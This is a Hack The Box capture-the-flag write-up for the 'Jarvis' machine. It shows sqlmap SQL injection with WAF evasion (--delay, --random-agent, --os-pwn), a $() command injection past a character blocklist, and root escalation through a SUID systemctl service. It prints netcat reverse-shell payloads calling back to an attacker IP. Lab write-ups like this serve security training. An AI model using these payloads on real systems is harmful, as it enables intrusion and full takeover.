---
layout: single
title: Jarvis - Hack The Box
excerpt: "The entrypoint for Jarvis is an SQL injection vulnerability in the web application to book hotel rooms. There is a WAF but I was able to easily get around it by lowering the amount of requests per second in sqlmap and changing the user-agent header. After landing a shell, I exploit a simple command injection to get access to another user then I use systemctl which has been set SUID root to create a new service and get root RCE."
date: 2019-11-09
classes: wide
header:
  teaser: /assets/images/htb-writeup-jarvis/jarvis_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - linux
  - sqli
  - sqlmap
  - waf
  - command injection
  - suid
  - systemd
---

![](/assets/images/htb-writeup-jarvis/jarvis_logo.png)

The entrypoint for Jarvis is an SQL injection vulnerability in the web application to book hotel rooms. There is a WAF but I was able to easily get around it by lowering the amount of requests per second in sqlmap and changing the user-agent header. After landing a shell, I exploit a simple command injection to get access to another user then I use systemctl which has been set SUID root to create a new service and get root RCE.

## Summary

- There's a SQL injection vulnerability in the `room.php` code that can be used to dump the database and get RCE
- We can escalate from `www-data` to `pepper` user by command injection in the `simpler.py` script
- For privesc, the `systemctl` has been made SUID so we can just register a new service that spawns a reverse shell as root

### Portscan

```
# nmap -sC -sV -p- 10.10.10.143
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-23 13:21 EDT
Nmap scan report for jarvis.htb (10.10.10.143)
Host is up (0.024s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web enumeration on port 64999

The page on port 64999 displays a banned error message. This page is used whenever the protection mecanism is triggered on the box. Traffic to port 80 is redirected to port 64999 using iptables whenever an SQL injection is detected.

![](/assets/images/htb-writeup-jarvis/3.png)

### Web enumeration on port 80

On port 80 we have the webpage of Stark Hotel.

![](/assets/images/htb-writeup-jarvis/1.png)

There's a link that display the various rooms.

![](/assets/images/htb-writeup-jarvis/2.png)

I spidered the website with Burp and found a couple of PHP files.

![](/assets/images/htb-writeup-jarvis/4.png)

To book a room, the `room.php` file takes the `cod` parameter. The room ID is probably stored in a database so this is target for a potential SQL injection.

### SQL injection

I used sqlmap to scan for SQL injection points:

`sqlmap -u http://jarvis.htb/room.php?cod=1 -p cod`

![](/assets/images/htb-writeup-jarvis/sql1.png)

I started getting 404 errors and got the `Hey you have been banned for 90 seconds, don't be bad` message when I tried browsing the site. There's some kind of WAF on the site that triggers when it's being scanned for SQL injections.

There's an HTTP header in the response that confirms this:

![](/assets/images/htb-writeup-jarvis/waf.png)

To bypass the WAF, I changed the User-Agent header to a random header and added a delay when scanning with SQLmap:

`sqlmap -u http://jarvis.htb/room.php?cod=1 -p cod --delay 2 --random-agent`

![](/assets/images/htb-writeup-jarvis/sql2.png)

sqlmap found 3 type of SQL injections

- boolean-based blind
- time-based blind
- UNION query

By default, sqlmap will use the union query since it's much faster than the other two.

We easily get a shell using the `--os-pwn` option in sqlmap:

`sqlmap -u http://jarvis.htb/room.php?cod=1 -p cod --delay 2 --random-agent --os-pwn`

![](/assets/images/htb-writeup-jarvis/met1.png)

![](/assets/images/htb-writeup-jarvis/met2.png)

![](/assets/images/htb-writeup-jarvis/met3.png)

### Escalating to user pepper

`/var/www/Admin-Utilities` contains a `simpler.py` script that can be executed as user `pepper` through sudo:

```
www-data@jarvis:~/Admin-Utilities$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

The ping function contains a command injection vulnerability. Because it uses the `os.system` function to execute the ping, we can pass additional parameters to execute commands.

```python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

There's a list of forbidden commands so we can't simply use the semi-colon or ampersand characters to inject commands but the `$()` characters are not filtered.

I've created a small script that's execute a netcat reverse shell into `/dev/shm/shell.sh`:

```sh
#!/bin/sh
nc -e /bin/bash 10.10.14.5 5555
```

I can execute the script by injecting the following payload in `simpler.py`:

```
www-data@jarvis:~$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(/dev/shm/shell.sh)
$(/dev/shm/shell.sh)
```

I now have a shell as `pepper`:

```
# nc -lvnp 5555
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.10.10.143.
Ncat: Connection from 10.10.10.143:38924.
id
uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
python -c 'import pty;pty.spawn("/bin/bash")'
pepper@jarvis:/var/www$ cd
cd
pepper@jarvis:~$ ls
ls
Web  user.txt
pepper@jarvis:~$ cat user.txt
2afa36c...
```

### Privesc

Looking at SUID binaries, the `systemctl` program stands out since it's not normally SUID:

```
pepper@jarvis:~$ find / -perm /4000 2>/dev/null
[...]
/bin/systemctl
[...]
```

The group has been changed to `pepper` so this is likely our next target:

```
pepper@jarvis:~$ ls -l /bin/systemctl
-rwsr-x--- 1 root pepper 174520 Feb 17 03:22 /bin/systemctl
```

Because we can run `systemctl` as root, we can register new services that get executed as whatever user we want. Getting root access is simple since all we need to do is register a new service that's spawn another reverse shell. I'll just create `/dev/shm/pwn.service`:

```
[Unit]
Description=Pwn service

[Service]
ExecStart=/bin/nc -e /bin/bash 10.10.14.5 7777

[Install]
WantedBy=multi-user.target
```

Then register the new service and start it:

```
pepper@jarvis:/dev/shm$ systemctl enable /dev/shm/pwn.service
Created symlink /etc/systemd/system/multi-user.target.wants/pwn.service -> /dev/shm/pwn.service.
Created symlink /etc/systemd/system/pwn.service -> /dev/shm/pwn.service.
pepper@jarvis:/dev/shm$ systemctl start pwn
```

We then get a reverse shell as root:

```
# nc -lvnp 7777
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 10.10.10.143.
Ncat: Connection from 10.10.10.143:48144.
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
d41d8cd...
```